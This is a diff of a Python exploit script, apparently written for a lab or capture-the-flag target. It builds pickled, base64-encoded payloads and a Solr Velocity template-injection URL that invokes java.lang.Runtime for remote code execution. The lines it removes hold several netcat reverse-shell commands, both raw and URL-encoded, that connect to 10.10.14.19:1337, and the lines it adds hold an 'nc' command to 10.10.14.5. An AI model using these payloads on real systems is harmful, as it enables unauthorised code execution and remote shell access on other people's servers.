@@ -30,19 +30,14 @@ rind = 2
 def make_payload(payload):
     print("--------------------------------------------------------------------------------")
     global rind
-    print(payload)
     #p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'", "id":"'+ str(rind) + '"}'
     #p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'"}'
     p = '{"home_page_url": "http://localhost:8983","feed_url": "'+payload+'"}'
-    print(p)
-    rind += 1
 
     # For storing 
     p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
     p = base64.b64encode(p)
     #p = base64.urlsafe_b64encode(p)
-    print()
-    print(base64.urlsafe_b64decode(p))
     return p 
 
 def run(t):
@@ -79,24 +74,9 @@ if __name__ == '__main__':
     ###########################################################################
     # rce
     ###########################################################################
-    '''
-    command = "nc -e /bin/bash 10.10.14.19 1337"
-    command = "nc 10.10.14.19 1337 -e /bin/bash"
-    command = "nc 10.10.14.19 1337"
-    '''
-    c = "rm /tmp/kun;mkfifo /tmp/kun;cat /tmp/kun|/bin/bash -i 2>&1|nc 10.10.14.19 1337 >/tmp/kun"
-    # encode space
-    c = "rm%20/tmp/kun;mkfifo%20/tmp/kun;cat%20/tmp/kun|/bin/bash%20-i%202>&1|nc%2010.10.14.19%201337%20>/tmp/kun"
-    # encode space and semi colons
-    c = "rm%20/tmp/kun%3Bmkfifo%20/tmp/kun%3Bcat%20/tmp/kun|/bin/bash%20-i%202>&1|nc%2010.10.14.19%201337%20>/tmp/kun"
-    # encode space and semi colons and pipe
-    c = "rm%20/tmp/kun%3Bmkfifo%20/tmp/kun%3Bcat%20/tmp/kun%7Cbin/bash%20-i%202>&1%7Cnc%2010.10.14.19%201337%20>/tmp/kun"
-    # encode space and semi colons and pipe and arrow
-    c = "rm%20/tmp/kun%3Bmkfifo%20/tmp/kun%3Bcat%20/tmp/kun%7Cbin/bash%20-i%202%3E%261%7Cnc%2010.10.14.19%201337%20%3E/tmp/kun"
-    #full encode
-    command = "rm /tmp/kun;mkfifo /tmp/kun;cat /tmp/kun|/bin/bash -i 2>&1|nc 10.10.14.19 1337 >/tmp/kun"
-    command = "nc 10.10.14.19 1337"
-    c = urllib.parse.quote(command)
+    port = "1999"
+    cmd = "nc 10.10.14.5 1999"
+    c = urllib.parse.quote(cmd)
     url = ("/select?q=1&wt=velocity&v.template=custom&v.template.custom="
         "%23set($x=%27%27)+"
         "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
